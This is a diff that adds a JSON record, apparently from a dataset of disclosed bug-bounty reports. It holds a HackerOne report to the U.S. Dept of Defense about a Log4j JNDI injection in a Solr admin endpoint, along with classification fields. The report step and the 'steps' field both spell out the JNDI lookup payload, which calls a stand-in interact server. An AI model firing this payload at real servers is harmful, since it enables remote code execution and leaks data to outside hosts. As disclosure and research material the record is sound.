@@ -1,0 +1,45 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "hachimanxienim ",
+  "title": "solr_log4j - http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+  "content": "\nHi security team, i found a solr log4j vulnerability in your aplication\nImpact\nLogging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nJust send get request to this path and change your interact server\nPATH ----> http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.YOURINTERACTSERVER/a%7D\nSuggested Mitigation/Remediation Actions\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1662505800,
+  "report_url": "https://hackerone.com/reports/1631370",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Identify the Solr admin endpoint: http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/solr/admin/collections"
+    ],
+    [
+      2,
+      "Send a GET request to the endpoint with a crafted JNDI payload: http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.YOURINTERACTSERVER/a%7D"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Log4j Remote Code Execution (RCE) issue in the Solr application. By logging untrusted or user-controlled data with a vulnerable version of Log4J, an attacker can execute arbitrary code remotely. This includes exploiting logged errors, exception traces, or authentication failures where user input is included.",
+  "reason": "The attack involves a straightforward exploitation of a well-known vulnerability (Log4j RCE) using a simple JNDI payload. The steps are minimal and do not require complex interactions or state manipulation. The vulnerability is widely documented, making it easier to discover and exploit.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves exploiting a Log4j vulnerability through a specific HTTP request path, which is not related to authentication or authorization boundaries within the same application. The methodology described focuses on testing AuthN/AuthZ and IDOR vulnerabilities by swapping user sessions and resource IDs within the same application context, not on detecting RCE vulnerabilities via external service interactions.",
+    "is_detectable": false
+  }
+}
